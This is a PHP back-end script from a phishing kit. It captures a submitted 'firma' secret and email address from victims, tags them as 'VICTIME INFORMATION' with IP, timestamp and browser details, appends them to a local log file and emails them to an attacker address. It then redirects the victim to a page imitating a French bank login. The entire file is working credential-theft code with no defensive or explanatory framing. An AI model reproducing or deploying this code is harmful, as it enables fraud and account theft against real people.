<?php
include('Email.php');
include('get_browser.php');
include('get_ip.php');
include('funciones.php');

$ip= $_SERVER['REMOTE_ADDR'];
$TIME_DATE = date('H:i:s d/m/Y');

$rand =rand(1000,9999999);

$DCH_MESSAGE .= "<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
❤ <font style='color: #000f82;'>BY MATCHO</font> ❤<br/>
================( <font style='color: #0a5d00;'>firma ".$ip."</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [firma KEY] = <font style='color:#ba0000;'>".$_POST['firma']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [email KEY] = <font style='color:#ba0000;'>".$_POST['Correo']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>".$ip."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
❤ <font style='color: #000f82;'>BY MATCHO</font> ❤<br/>
</div></html>\n";
functiondilih(strip_tags($DCH_MESSAGE));
$khraha = fopen("../RZL.html", "a");
fwrite($khraha, $DCH_MESSAGE);
$DCH_SUBJECT .= "$ip";
$DCH_HEADERS .= "From: Tiger<cantact>";
$DCH_HEADERS .= "Dch-Version: 1.0\n";
$DCH_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
@mail($DCH_EMAIL, $DCH_SUBJECT, $DCH_MESSAGE, $DCH_HEADERS);
HEADER("Location: ../accounte.php?assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");




?>